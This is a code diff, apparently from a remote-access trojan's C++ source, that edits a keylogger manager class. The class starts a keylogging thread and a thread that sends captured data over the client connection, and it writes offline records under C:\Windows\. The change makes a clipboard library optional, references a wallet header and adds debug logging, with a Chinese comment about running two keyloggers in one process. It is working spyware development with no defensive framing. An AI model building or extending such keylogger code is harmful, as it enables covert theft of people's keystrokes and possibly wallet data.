@@ -19,7 +19,13 @@
 #include <iniFile.h>
 
 #define CAPTION_SIZE 1024
+
+// 这个库不支持一个进程运行2份键盘记录的需求（例如分享主机）
+// 未来也许移除对clip的使用
+#define USING_CLIP 0
+
 #include "wallet.h"
+#if USING_CLIP
 #include "clip.h"
 #ifdef _WIN64
 #ifdef _DEBUG
@@ -34,10 +40,15 @@
 #pragma comment(lib, "clip.lib")
 #endif
 #endif
+#else
+#include "my_clip.h"
+#endif
 
 CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user) : CManager(pClient)
 {
+#if USING_CLIP
     clip::set_error_handler(NULL);
+#endif
     m_bIsOfflineRecord = offline;
 
     char path[MAX_PATH] = { "C:\\Windows\\" };
@@ -53,6 +64,7 @@ CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user
     m_hWorkThread = __CreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
     m_hSendThread = __CreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
     SetReady(TRUE);
+    Mprintf("CKeyboardManager1: Start %p\n", this);
 }
 
 CKeyboardManager1::~CKeyboardManager1()
@@ -66,6 +78,7 @@ CKeyboardManager1::~CKeyboardManager1()
     SAFE_CLOSE_HANDLE(m_hSendThread);
     m_Buffer->WriteAvailableDataToFile(m_strRecordFile);
     delete m_Buffer;
+    Mprintf("~CKeyboardManager1: Stop %p\n", this);
 }
 
 void CKeyboardManager1::Notify()
